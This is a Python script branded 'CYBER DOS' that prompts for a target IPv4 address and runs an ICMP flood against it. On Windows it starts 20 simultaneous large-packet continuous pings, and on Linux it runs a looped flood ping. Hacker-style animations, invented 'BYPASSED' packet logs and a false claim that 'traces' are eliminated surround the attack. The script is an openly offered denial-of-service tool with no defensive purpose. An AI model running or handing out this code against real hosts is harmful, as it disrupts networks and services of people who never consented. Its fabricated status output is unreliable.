import os, sys, subprocess, threading, time
import random
import platform
import re
import colorama

# Install required packages if not present
try:
    from termcolor import colored
    import cursor
except ImportError:
    os.system('pip install termcolor cursor' if os.name != "nt" else "py -m pip install termcolor cursor")
    print("[+] Installing Required Packages...")
    from termcolor import colored
    import cursor

# Animated ASCII art
cyber_art = [
    """
 ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗  ██████╗ ███████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔═══██╗██╔════╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██║  ██║██║   ██║███████╗
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██║  ██║██║   ██║╚════██║
╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██████╔╝╚██████╔╝███████║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                       
           //--- v1.8 - THE DIGITAL PHANTOM - Ac1x ---\\
"""
]

colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
is_windows = platform.system().lower() == 'windows'

def clear_screen():
    os.system('cls' if is_windows else 'clear')

def animate_text(text, color='green', delay=0.03):
    for char in text:
        sys.stdout.write(colored(char, color))
        sys.stdout.flush()
        time.sleep(delay)
    print()

def display_loading_bar(duration, length=40):
    start_time = time.time()
    while time.time() - start_time < duration:
        progress = (time.time() - start_time) / duration
        bar_length = int(length * progress)
        bar = '[' + '#' * bar_length + ' ' * (length - bar_length) + ']'
        percentage = int(progress * 100)
        sys.stdout.write('\r' + colored(f"Initializing: {bar} {percentage}% ", 'cyan'))
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def display_matrix_effect():
    matrix_chars = "01"
    width = os.get_terminal_size().columns if hasattr(os, 'get_terminal_size') else 80
    for _ in range(10):
        line = ''.join(random.choice(matrix_chars) for _ in range(width))
        print(colored(line, random.choice(colors)))
        time.sleep(0.1)

def flash_text(text, flashes=3, delay=0.1):
    for _ in range(flashes):
        clear_screen()
        time.sleep(delay)
        print(colored(text, random.choice(colors)))
        time.sleep(delay)

def animate_art():
    for art in cyber_art:
        clear_screen()
        print(colored(art, random.choice(colors)))
        time.sleep(0.3)

def print_status(message, status_type="info"):
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    
    if status_type == "info":
        prefix = colored("[INFO]", 'blue')
    elif status_type == "warning":
        prefix = colored("[WARNING]", 'yellow')
    elif status_type == "error":
        prefix = colored("[ERROR]", 'red')
    elif status_type == "success":
        prefix = colored("[SUCCESS]", 'green')
    
    print(f"{prefix} {colored(timestamp, 'white')} - {message}")

def get_ping_command(ip):
    if is_windows:
        # Updated Windows compatible ping command
        # Use -t for continuous ping and maximum allowed packet size
        return f"ping {ip} -t -l 65500"
    else:
        # Linux/Unix ping command
        return f"ping {ip} -f -i 0.002 -s 65535 -c 10000"

def run_windows_multithreaded_ping(ip, stop_event):
    packet_size = 65500  # Maximum size for Windows
    process_list = []
    
    # Launch multiple ping processes
    for _ in range(20):  # Launch 20 simultaneous pings
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            cmd = f"ping {ip} -t -l {packet_size}"
            
            process = subprocess.Popen(
                cmd, 
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                startupinfo=startupinfo
            )
            process_list.append(process)
        except Exception as e:
            print_status(f"Failed to start ping process: {e}", "error")
    
    # Keep checking if we should stop
    while not stop_event.is_set():
        time.sleep(0.5)
    
    # Terminate all processes when stop_event is set
    for proc in process_list:
        try:
            proc.terminate()
        except:
            pass

def run_linux_ping(ip, stop_event):
    cmd = f"ping {ip} -f -i 0.002 -s 65500 -c 10000"
    
    while not stop_event.is_set():
        try:
            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.1)
        except Exception as e:
            print_status(f"Operation failed: {e}", "error")
            time.sleep(1)

def main(ip, stop_event):
    attempts = 0
    
    # Choose the appropriate ping method based on OS
    if is_windows:
        run_windows_multithreaded_ping(ip, stop_event)
    else:
        run_linux_ping(ip, stop_event)
    
    # Simulated traffic visualization thread
    while not stop_event.is_set():
        attempts += 1
        print_status(f"Flooding attempt #{attempts}", "info")
        
        # Simulate hacking feedback
        for _ in range(5):
            packet_size = random.randint(30000, 65500)
            timestamp = time.strftime("%H:%M:%S", time.localtime())
            status = random.choice(["TRANSMITTED", "BYPASSED", "DELIVERED"])
            print(colored(f"[{timestamp}] Packet({packet_size}) {status} -> {ip}", 'green'))
            time.sleep(0.2)
        
        time.sleep(0.5)
    
    print_status(f"Operation terminated after {attempts} cycles", "warning")

if __name__ == "__main__":
    try:
        cursor.hide()
        
        clear_screen()
        display_matrix_effect()
        time.sleep(0.5)
        animate_art()
        
        animate_text("   //--- WELCOME TO THE DIGITAL REALM ---\\\\", 'cyan')
        time.sleep(0.5)
        
        display_loading_bar(2)
        
        animate_text("\n[*] Initializing cyber targets module...", 'yellow')
        time.sleep(0.3)
        animate_text("[*] Loading attack vectors...", 'yellow')
        time.sleep(0.3)
        animate_text("[*] Detected OS: " + colored(platform.system(), 'red'), 'yellow')
        time.sleep(0.3)
        animate_text("[+] System ready. Awaiting target designation.", 'green')
        
        while True:
            IP = input(colored("\n[>] Enter target IP address [IPv4 only]\n>> ", 'cyan')).strip()
            
            print_status("Validating target...", "info")
            ipv4_format = r'\b((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b'

            match = re.search(ipv4_format, IP)
            if not match:
                print(f"[ SYSTEM ] Please Enter A Valid IPv4 Address! e.g; 192.168.xxx.xxx\n")

            else:
                break
                
        time.sleep(1)
        print_status(f"Target {IP} confirmed", "success")
        
        flash_text(f"\n>>> INITIATING OPERATION ON {IP} <<<")
        
        stop_event = threading.Event()
        thread = threading.Thread(target=main, args=(IP, stop_event))
        thread.daemon = True
        thread.start()
        
        print_status("Operation in progress. Press ENTER to terminate.", "warning")
        input()
        
        print_status("Shutting down operations...", "warning")
        stop_event.set()
        thread.join(timeout=2)
        
        animate_text("\n[*] Operation complete. Cleaning up traces...", 'yellow')
        display_loading_bar(2)
        print_status("All traces eliminated. Shutting down safely.", "success")
        
    except KeyboardInterrupt:
        print_status("\nEmergency shutdown initiated!", "error")
    
    finally:
        try:
            cursor.show()
        except:
            pass
        time.sleep(1)
        clear_screen()
        animate_text("SYSTEM DISCONNECTED", 'red')